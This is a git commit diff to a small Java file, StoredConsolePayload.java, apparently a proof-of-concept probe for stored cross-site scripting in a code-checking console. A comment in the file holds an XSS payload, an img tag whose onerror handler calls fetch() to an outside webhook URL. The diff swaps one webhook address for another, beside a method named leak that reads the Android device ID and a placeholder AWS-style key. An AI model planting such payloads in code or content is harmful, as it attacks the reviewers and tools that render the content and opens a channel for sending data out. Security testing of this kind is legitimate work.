49084f1188f9362a84a4d122c245e09e6ce3310b
ChecksPoc <checks-poc@example.invalid>
2026-05-26 16:45:27 +0200

    Update ci-xss webhook receiver

--- StoredConsolePayload.java
+++ StoredConsolePayload.java
@@ -1,7 +1,7 @@
 class StoredConsolePayload {
   void leak(android.content.ContentResolver cr) {
     String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
-    /* S1_CONSOLE_XSS_20260526 <img src=x onerror=fetch('https://webhooksite.net/0526b795-8a2c-495b-a6ca-3c7d494aa00c?surface=checks-console&marker=S1_CONSOLE_XSS_20260526')> */
+    /* S1_CONSOLE_XSS_WEBHOOK2_20260526 <img src=x onerror=fetch('https://webhooksite.net/582de30f-b284-4090-9014-9aaecb9ad551?surface=checks-console&marker=S1_CONSOLE_XSS_WEBHOOK2_20260526')> */
     String marker = "S1_PR_ARBITRARY_CONTENT_MARKER_20260526";
     String fakeKey = "AKIA_TEST_ONLY_NOT_A_SECRET_20260526";
   }
